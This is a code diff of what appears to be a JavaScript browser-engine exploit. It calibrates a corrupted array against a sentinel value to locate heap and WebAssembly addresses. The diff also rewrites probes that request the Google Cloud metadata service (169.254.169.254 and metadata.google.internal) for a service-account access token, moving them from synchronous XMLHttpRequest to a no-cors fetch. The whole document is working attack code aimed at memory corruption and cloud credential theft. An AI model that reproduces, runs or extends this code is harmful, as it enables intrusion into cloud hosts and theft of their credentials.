@@ -44,9 +44,9 @@ if(Array.isArray(m)){
   log("L: "+m.length);
 
   // SELF-CALIBRATE: scan for pinnedDoubles[0]=10.125 in master
-  // Also check pinnedDoubles[1]=10.126 to confirm sequential match
+  // PIN=0x1100011 → expected index 0. But if PIN differs, scan nearby.
   let calIdx=-1;
-  for(let k=0;k<0x40000;k++){
+  for(let k=0;k<0x2000;k++){
     try{
       const v=m[k];
       if(Math.abs(v-10.125)<0.0001){
@@ -86,27 +86,13 @@ if(Array.isArray(m)){
       // Reading wasmAddr+0 gives the map, wasmAddr+4 gives properties...
       // We need heapRead at wasmAddr — scan master for the map value
 
-      // Quick test: try fetch to metadata from THIS origin
+      // Metadata probes (async, non-blocking)
       try{
-        const x=new XMLHttpRequest();
-        x.open("GET","http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token",false);
-        x.setRequestHeader("Metadata-Flavor","Google");
-        x.send();
-        log("META: "+x.status+" "+x.responseText.substring(0,80));
-      }catch(e){
-        log("META_ERR: "+e.message.substring(0,50));
-      }
-
-      // Also try metadata.google.internal
-      try{
-        const x2=new XMLHttpRequest();
-        x2.open("GET","http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/",false);
-        x2.setRequestHeader("Metadata-Flavor","Google");
-        x2.send();
-        log("META2: "+x2.status+" "+x2.responseText.substring(0,80));
-      }catch(e){
-        log("META2_ERR: "+e.message.substring(0,50));
-      }
+        fetch("http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token",
+          {headers:{"Metadata-Flavor":"Google"},mode:"no-cors"})
+          .then(r=>log("META:"+r.status+"/"+r.type))
+          .catch(e=>log("META_E:"+e.message.substring(0,30)));
+      }catch(e){}
     }
   }else{
     log("CAL_MISS: 10.125 not found in first 0x40000 slots");
